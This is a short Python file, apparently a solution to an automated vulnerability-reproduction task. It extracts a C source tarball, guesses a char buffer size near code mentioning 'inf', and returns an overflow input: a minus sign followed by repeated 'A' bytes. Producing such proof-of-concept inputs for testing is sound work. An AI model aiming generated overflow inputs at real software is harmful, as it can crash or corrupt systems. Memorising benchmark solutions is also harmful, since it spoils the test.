import tarfile
import os
import re
import tempfile

class Solution:
    def solve(self, src_path: str) -> bytes:
        buffer_size = self._guess_buffer_size(src_path)
        if buffer_size is None:
            buffer_size = 15
        # Ensure we do not produce "inf" after the minus
        # Use 'A' which is not 'i', and make sure the first three are not "inf"
        # So just repeat 'A'
        poc = b'-' + b'A' * buffer_size
        return poc

    def _guess_buffer_size(self, src_path: str) -> int | None:
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                with tarfile.open(src_path, 'r') as tar:
                    tar.extractall(tmpdir)
                c_files = []
                for root, _, files in os.walk(tmpdir):
                    for f in files:
                        if f.endswith(('.c', '.cpp', '.cc', '.C')):
                            c_files.append(os.path.join(root, f))
                buffer_sizes = []
                for file in c_files:
                    try:
                        with open(file, 'r', errors='ignore') as f:
                            content = f.read()
                    except:
                        continue
                    # Look for char array declarations
                    pattern = r'char\s+[a-zA-Z_][a-zA-Z0-9_]*\s*\[\s*([0-9]+)\s*\]'
                    for match in re.finditer(pattern, content):
                        start = match.start()
                        # Find line number
                        line_start = content.rfind('\n', 0, start) + 1
                        line_end = content.find('\n', start)
                        if line_end == -1:
                            line_end = len(content)
                        line = content[line_start:line_end]
                        # Check if line or nearby lines contain "inf" (case-insensitive)
                        # We'll check a window of 10 lines around the match
                        lines_before = content.count('\n', 0, line_start)
                        # Extract a window of 20 lines total (10 before, 10 after)
                        all_lines = content.split('\n')
                        win_start = max(0, lines_before - 10)
                        win_end = min(len(all_lines), lines_before + 10)
                        window = '\n'.join(all_lines[win_start:win_end])
                        if re.search(r'\binf\b', window, re.IGNORECASE):
                            buffer_sizes.append(int(match.group(1)))
                if buffer_sizes:
                    return min(buffer_sizes)
        except Exception:
            pass
        return None